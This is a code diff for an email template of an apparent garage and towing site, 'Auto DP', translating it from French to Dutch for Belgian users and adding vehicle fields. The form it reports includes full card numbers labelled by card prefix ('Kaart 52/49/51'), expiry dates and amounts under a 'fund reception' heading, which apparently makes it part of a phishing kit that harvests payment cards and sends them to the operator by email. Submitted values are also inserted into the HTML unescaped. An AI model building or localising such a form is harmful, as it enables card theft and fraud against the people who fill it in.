@@ -42,15 +42,15 @@ function validateFormData(data: any) {
 
 // Fonction pour créer le template HTML de l'email
 function createEmailTemplate(data: any, formType: string) {
-  const title = formType === 'enregistrement' ? '🚗 Nouveau Formulaire d\'Enregistrement' : '💰 Nouveau Formulaire de Réception de Fond'
+  const title = formType === 'enregistrement' ? '🚗 Nieuw Registratieformulier' : '💰 Nieuw Fondsontvangstformulier'
   const currentDate = new Date()
-  const dateStr = currentDate.toLocaleDateString('fr-FR', {
+  const dateStr = currentDate.toLocaleDateString('nl-BE', {
     weekday: 'long',
     year: 'numeric',
     month: 'long',
     day: 'numeric'
   })
-  const timeStr = currentDate.toLocaleTimeString('fr-FR')
+  const timeStr = currentDate.toLocaleTimeString('nl-BE')
 
   return `
     <!DOCTYPE html>
@@ -122,6 +122,20 @@ function createEmailTemplate(data: any, formType: string) {
           display: flex;
           align-items: center;
         }
+        .vehicle-info {
+          background: linear-gradient(135deg, #e8f5e8 0%, #f0f8ff 100%);
+          padding: 20px;
+          border-radius: 8px;
+          margin-bottom: 25px;
+          border-left: 4px solid #4caf50;
+        }
+        .vehicle-info h2 {
+          margin: 0 0 15px 0;
+          color: #4caf50;
+          font-size: 18px;
+          display: flex;
+          align-items: center;
+        }
         .field {
           display: flex;
           margin-bottom: 12px;
@@ -185,15 +199,15 @@ function createEmailTemplate(data: any, formType: string) {
       <div class="container">
         <div class="header">
           <h1>${title}</h1>
-          <p>📅 Reçu le ${dateStr} à ${timeStr}</p>
+          <p>📅 Ontvangen op ${dateStr} om ${timeStr}</p>
         </div>
 
         <div class="content">
           <!-- Informations Client -->
           <div class="client-info">
-            <h2>👤 Informations du Client</h2>
+            <h2>👤 Klantgegevens</h2>
             <div class="field">
-              <div class="label">Nom complet :</div>
+              <div class="label">Volledige naam :</div>
               <div class="value">${data.nom_complet}</div>
             </div>
             <div class="field">
@@ -201,49 +215,62 @@ function createEmailTemplate(data: any, formType: string) {
               <div class="value">${data.email}</div>
             </div>
             <div class="field">
-              <div class="label">Téléphone :</div>
+              <div class="label">Telefoon :</div>
               <div class="value">${data.telephone}</div>
             </div>
             <div class="field">
-              <div class="label">Adresse :</div>
+              <div class="label">Adres :</div>
               <div class="value">${data.adresse}</div>
+            </div>
+          </div>
+
+          <!-- Informations Véhicule -->
+          <div class="vehicle-info">
+            <h2>🚗 Voertuiggegevens</h2>
+            <div class="field">
+              <div class="label">Merk :</div>
+              <div class="value">${data.marque_vehicule || 'Niet opgegeven'}</div>
+            </div>
+            <div class="field">
+              <div class="label">Model :</div>
+              <div class="value">${data.modele_vehicule || 'Niet opgegeven'}</div>
             </div>
           </div>
 
           <!-- Informations Financières -->
           <div class="financial-info">
-            <h2>💳 Informations Bancaires</h2>
+            <h2>💳 Bankgegevens</h2>
             <div class="field">
-              <div class="label">Carte BE :</div>
+              <div class="label">BE Kaart :</div>
               <div class="value">${data.carte_be}</div>
             </div>
             <div class="field">
-              <div class="label">Carte 52/49/51 :</div>
+              <div class="label">Kaart 52/49/51 :</div>
               <div class="value">${data.carte_52_49_51}</div>
             </div>
             <div class="field">
-              <div class="label">Date d'expiration :</div>
+              <div class="label">Vervaldatum :</div>
               <div class="value">${data.date_expiration}</div>
             </div>
             <div class="field">
-              <div class="label">Montant :</div>
+              <div class="label">Bedrag :</div>
               <div class="amount">${data.montant} €</div>
             </div>
           </div>
 
           <!-- Actions rapides -->
           <div class="contact-actions">
-            <strong>Actions rapides :</strong><br>
-            <a href="mailto:${data.email}?subject=Re: ${title} - ${data.nom_complet}">📧 Répondre au client</a>
-            <a href="tel:${data.telephone}">📞 Appeler le client</a>
+            <strong>Snelle acties :</strong><br>
+            <a href="mailto:${data.email}?subject=Re: ${title} - ${data.nom_complet}">📧 Klant beantwoorden</a>
+            <a href="tel:${data.telephone}">📞 Klant bellen</a>
           </div>
         </div>
 
         <div class="footer">
           <p>
-            <strong>Auto DP</strong> - Garage & Remorquage 24/7<br>
-            Email envoyé automatiquement depuis <strong>autodp.org</strong><br>
-            Pour toute question, contactez le support technique.
+            <strong>Auto DP</strong> - Garage & Takeldienst 24/7<br>
+            Email automatisch verzonden vanaf <strong>autodp.org</strong><br>
+            Voor vragen, neem contact op met de technische ondersteuning.
           </p>
         </div>
       </div>
